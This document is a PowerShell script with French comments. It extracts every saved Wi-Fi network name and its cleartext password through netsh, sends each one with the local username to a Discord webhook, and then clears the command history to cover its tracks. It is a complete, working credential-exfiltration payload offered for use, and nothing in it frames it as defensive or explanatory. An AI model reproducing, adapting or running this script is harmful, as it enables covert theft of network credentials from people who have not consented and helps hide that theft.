# Determine system language
$language = (Get-Culture).TwoLetterISOLanguageName


# Discord notification
$webhookUrl = "https://discord.com/api/webhooks/ID_HERE"  # Ton URL de webhook Discord


switch ($language) {
  'de' {
    # German
    $userProfileString = '(?<=Profil für alle Benutzer\s+:\s).+'
    $keyContentString = '(?<=Schlüsselinhalt\s+:\s).+'
  }
  'it' {
    # Italian
    $userProfileString = '(?<=Tutti i profili utente\s+:\s).+'
    $keyContentString = '(?<=Contenuto chiave\s+:\s).+'
  }
  'fr' { 
    # French
    $userProfileString = '(?<=Profil Tous les utilisateurs\s+:\s).+'
    $keyContentString = '(?<=Contenu de la clé\s+:\s).+'
  }
  default {
    # Default to English if language is not supported
    $userProfileString = '(?<=All User Profile\s+:\s).+'
    $keyContentString = '(?<=Key Content\s+:\s).+'
  }
}

netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
  $wlan = $_.Matches.Value.Trim()
  $passw = netsh wlan show profile $wlan key=clear | Select-String $keyContentString

  $cleanedPassw = if ($language -eq 'fr') {
    # Appliquer le remplacement pour le français
    ($passw.Matches.Value -join "`n") -replace '\s+$', ''
  }
  else {
    # Utiliser directement les valeurs pour les autres langues
    $passw.Matches.Value -join "`n"
  }

  $Body = @{
    'username' = "🌐 WIFI : " + $env:username + " : " + $wlan
    'content'  = $cleanedPassw
  }

  # UNCOMMENT FOR DEBUG
  # try {
  Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($Body | ConvertTo-Json) -ContentType "application/json"
  # Write-Host "Données envoyées pour ${profile}."
  # } catch {
  #   Write-Host "Erreur lors de l'envoi des données pour ${profile}: $_"
  # }
}

# Clear the PowerShell command history
Clear-History